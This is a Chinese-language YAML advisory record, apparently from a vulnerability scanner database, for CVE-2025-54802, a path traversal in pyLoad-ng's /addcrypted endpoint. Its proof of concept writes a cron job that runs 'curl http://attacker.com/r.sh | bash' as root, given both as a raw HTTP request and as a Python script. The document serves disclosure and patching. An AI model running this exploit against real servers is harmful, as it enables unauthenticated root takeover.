info:
  name: pyload-ng
  cve: CVE-2025-54802
  summary: pyLoad-ng CNL Blueprint 中通过 `package` 参数进行的路径遍历允许任意文件写入，从而导致远程代码执行 (RCE)。
  details: |
    `pyload-ng` 中的 `addcrypted` 端点存在不安全的路径构建漏洞，允许未经身份验证的攻击者在指定存储目录之外写入任意文件。这可能被滥用以覆盖关键系统文件，包括 cron 作业和 systemd 服务，从而导致权限提升和以 root 身份远程执行代码。
    **端点**：`POST /addcrypted`
    **问题**：`src/pyload/webui/app/blueprints/cnl_blueprint.py`
    #### 易受攻击的代码
    ```python
     dlc_path = os.path.join(
         dl_path, package.replace("/", "").replace("\\", "").replace(":", "") + ".dlc"
     )
     dlc = flask.request.form["crypted"].replace(" ", "+")
     with open(dlc_path, mode="wb") as fp:
    ```
    #### 概念验证 (PoC)
    ```http
    POST /addcrypted HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 107
    package=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==
    ```
    解码后的有效载荷：
    ```bash
    * * * * * root curl -s http://attacker.com/r.sh | bash
    ```
    **发送精心构造的 POST 请求**
    ```python
    import requests, base64
    payload = "* * * * * root curl http://attacker.com/rev.sh | bash"
    b64 = base64.b64encode(payload.encode()).decode()
    requests.post("http://localhost:8000/addcrypted", data={
        "package": "../../../../etc/cron.d/exploit",
        "crypted": b64
    })
    ```
    该漏洞允许未经身份验证的攻击者通过 `pyload-ng` 参数中 `addcrypted` 端点中的路径遍历缺陷，在预期目录之外写入任意文件。当被利用时，它可以通过注入恶意 cron 作业或系统文件，以 **root** 身份实现远程代码执行，将一个简单的文件上传端点变成一个完整的系统入侵载体。
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. 升级到版本 `0.5.0b3.dev90` 或更高版本。
    2. 如果无法立即升级，请应用提交 `70a44fe02c03bce92337b5d370d2a45caa4de3d4` 中的补丁。
    3. 对 `package` 参数实施严格的输入验证和清理，以防止目录遍历字符。
    4. 确保文件写入操作仅限于指定的非敏感目录。
rule: version < "0.5.0b3.dev90"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54802
  - https://github.com/pyload/pyload/pull/4596
  - https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4
  - https://github.com/pyload/pyload